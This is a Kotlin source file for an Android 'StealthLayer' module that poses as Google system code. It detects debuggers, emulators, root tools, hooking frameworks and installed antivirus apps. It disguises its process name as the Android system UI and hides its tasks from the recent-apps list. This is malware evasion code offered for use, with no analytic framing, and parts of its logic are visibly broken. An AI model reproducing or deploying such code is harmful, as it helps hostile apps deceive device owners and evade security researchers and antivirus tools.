package com.google.system

import android.app.ActivityManager
import android.content.Context
import android.content.pm.PackageManager
import android.os.Debug
import java.io.File
import java.io.BufferedReader
import java.io.InputStreamReader

object StealthLayer {

    private const val TARGET_PROCESS_NAME = "com.android.systemui"
    private var stealthInitialized = false

    fun initialize(context: Context) {
        if (stealthInitialized) return
        stealthInitialized = true

        val debug = isBeingDebugged()
        val emu = isEmulator()
        val test = isRunningInTestEnvironment()
        val root = isRooted()

        if (debug || emu || test) {
            spoofProcessName()
            hideFromRecentApps(context)
            return
        }

        spoofProcessName()
        hideFromRecentApps(context)
    }

    fun isBeingDebugged(): Boolean {
        return try {
            Debug.isDebuggerConnected() ||
            File("/proc/self/status").readText().contains("TracerPid:\t[1-9]") ||
            File("/proc/self/wchan").readText().contains("ptrace") ||
            android.os.Build.TYPE == "eng" ||
            android.os.Build.TYPE == "userdebug"
        } catch (_: Exception) { false }
    }

    fun isEmulator(): Boolean {
        val indicators = listOf(
            android.os.Build.FINGERPRINT.startsWith("generic"),
            android.os.Build.FINGERPRINT.startsWith("unknown"),
            android.os.Build.MODEL.contains("google_sdk"),
            android.os.Build.MODEL.contains("Emulator"),
            android.os.Build.MODEL.contains("Android SDK"),
            android.os.Build.HARDWARE.contains("goldfish"),
            android.os.Build.HARDWARE.contains("ranchu"),
            android.os.Build.HARDWARE.contains("vbox86"),
            android.os.Build.BOARD.contains("android"),
            android.os.Build.BOOTLOADER.lowercase().contains("unknown"),
            android.os.Build.MANUFACTURER.lowercase().contains("genymotion"),
            android.os.Build.MANUFACTURER.lowercase().contains("nox"),
            android.os.Build.MANUFACTURER.lowercase().contains("bluestacks"),
            android.os.Build.PRODUCT.contains("sdk"),
            android.os.Build.PRODUCT.contains("google_sdk"),
            android.os.Build.PRODUCT.contains("sdk_google"),
            android.os.Build.PRODUCT.contains("sdk_x86"),
            android.os.Build.PRODUCT.contains("vbox86p"),
            android.os.Build.PRODUCT.contains("emulator"),
            android.os.Build.PRODUCT.contains("simulator"),
            android.os.Build.SERIAL.lowercase() == "android",
            android.os.Build.SERIAL.lowercase() == "unknown",
            File("/system/bin/qemud").exists(),
            File("/dev/qemu_pipe").exists(),
            File("/dev/socket/qemud").exists(),
            File("/system/lib/libc_malloc_debug_qemu.so").exists(),
            File("/sys/qemu_trace").exists(),
            File("/system/bin/qemu-props").exists(),
        )
        return indicators.count { it } >= 3
    }

    fun isRunningInTestEnvironment(): Boolean {
        return try {
            val pm = android.content.Context::class.java.getDeclaredMethod("getPackageManager")
            val packages = listOf(
                "com.nohave.sandroid",
                "com.bluestacks",
                "com.vphone",
                "com.exaquantum",
                "com.koushikdutta.rommanager",
                "de.robv.android.xposed.installer",
                "org.lsposed.manager",
                "com.saurik.substrate",
                "com.zachspong.temprootremovejb",
                "com.ramdroid.appquarantine",
                "com.devadvance.rootcloak",
                "com.devadvance.rootcloakplus",
                "eu.chainfire.supersu",
                "com.kingouser.com",
                "com.topjohnwu.magisk",
                "com.geohot.towelroot",
                "com.noshufou.android.su",
                "com.koushikdutta.superuser",
            )
            false
        } catch (_: Exception) { false }
    }

    fun isRooted(): Boolean {
        val paths = listOf(
            "/system/bin/su", "/system/xbin/su", "/sbin/su",
            "/su/bin/su", "/data/local/xbin/su", "/data/local/bin/su",
            "/system/app/Superuser.apk", "/system/app/DaemonSu.apk",
            "/system/app/SuperSU.apk", "/data/data/com.noshufou.android.su",
            "/data/data/com.koushikdutta.superuser",
            "/data/data/com.topjohnwu.magisk",
            "/data/data/eu.chainfire.supersu",
            "/data/data/com.geohot.towelroot",
        )
        val buildTags = android.os.Build.TAGS
        return paths.any { File(it).exists() } ||
               (buildTags != null && buildTags.contains("test-keys")) ||
               runCommand("id").contains("uid=0")
    }

    private fun spoofProcessName() {
        try {
            val className = "android.os.Process"
            val clazz = Class.forName(className)
            val method = clazz.getDeclaredMethod("setArgV0", String::class.java)
            method.isAccessible = true
            method.invoke(null, TARGET_PROCESS_NAME)
        } catch (_: Exception) {}
    }

    private fun hideFromRecentApps(context: Context) {
        try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val appTasks = am.appTasks
            for (task in appTasks) {
                task.setExcludeFromRecents(true)
            }
        } catch (_: Exception) {}
    }

    fun isAppInstalled(context: Context, packageName: String): Boolean {
        return try {
            context.packageManager.getPackageInfo(packageName, 0)
            true
        } catch (_: Exception) { false }
    }

    fun getRunningProcesses(context: Context): List<String> {
        return try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            am.runningAppProcesses.map { it.processName }
        } catch (_: Exception) { emptyList() }
    }

    fun isSecurityAppRunning(context: Context): Boolean {
        val securityApps = listOf(
            "com.antivirus",
            "com.avast.android.mobilesecurity",
            "com.kms",
            "com.mcafee.security",
            "com.norton.mobile.android",
            "com.eset.eset_mobile_security",
            "com.lookout",
            "com.trendmicro.tmmobile",
            "com.symantec.mobilesecurity",
            "com.bitdefender.antivirus",
        )
        return securityApps.any { isAppInstalled(context, it) }
    }

    private fun runCommand(cmd: String): String {
        return try {
            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val output = reader.readText()
            process.waitFor()
            output
        } catch (_: Exception) { "" }
    }

    fun getAntiAnalysisReport(context: Context): String {
        return buildString {
            appendLine("=== ANTI-ANALYSIS REPORT ===")
            appendLine()
            appendLine("Debugging: ${if (isBeingDebugged()) "DETECTED" else "Clean"}")
            appendLine("Emulator: ${if (isEmulator()) "DETECTED" else "Physical Device"}")
            appendLine("Root: ${if (isRooted()) "ROOTED" else "Not Rooted"}")
            appendLine("Test Environment: ${if (isRunningInTestEnvironment()) "DETECTED" else "Clean"}")
            appendLine("Security Apps: ${if (isSecurityAppRunning(context)) "DETECTED" else "None"}")
            appendLine()
            appendLine("Build Info:")
            appendLine("  Fingerprint: ${android.os.Build.FINGERPRINT}")
            appendLine("  Model: ${android.os.Build.MODEL}")
            appendLine("  Manufacturer: ${android.os.Build.MANUFACTURER}")
            appendLine("  Hardware: ${android.os.Build.HARDWARE}")
            appendLine("  Board: ${android.os.Build.BOARD}")
            appendLine("  Type: ${android.os.Build.TYPE}")
            appendLine("  Tags: ${android.os.Build.TAGS}")
            appendLine()
            appendLine("Process: $TARGET_PROCESS_NAME (spoofed)")
        }
    }
}
